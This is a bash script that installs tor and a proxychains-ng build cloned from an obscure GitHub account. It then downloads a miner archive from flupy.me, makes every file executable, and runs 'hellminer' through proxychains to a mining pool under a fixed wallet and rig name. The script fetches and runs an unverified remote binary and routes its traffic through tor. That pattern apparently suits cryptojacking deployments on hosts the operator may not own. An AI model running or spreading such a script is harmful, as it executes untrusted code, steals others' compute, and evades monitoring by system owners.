#!/usr/bin/env bash
## Todo

# Update and install dependencies
apt-get update -y
apt-get install -y wget curl unzip gcc make tor python python-dev git

# Install proxychains-ng
rm -rf proxychains-ng
git clone https://github.com/ts6aud5vkg/proxychains-ng.git
cd proxychains-ng
make
make install
make install-config
cd ..

# Download and unzip the miner
wget https://flupy.me/miner.zip
unzip miner.zip
chmod +x *
# Run the miner with proxychains
proxychains4 ./hellminer -c stratum+tcp://na.luckpool.net:3956 -u RUf9nXasGVcz4mtWhYxENVzmQrpf1g5WXx.Rig002 -p x --threads 4
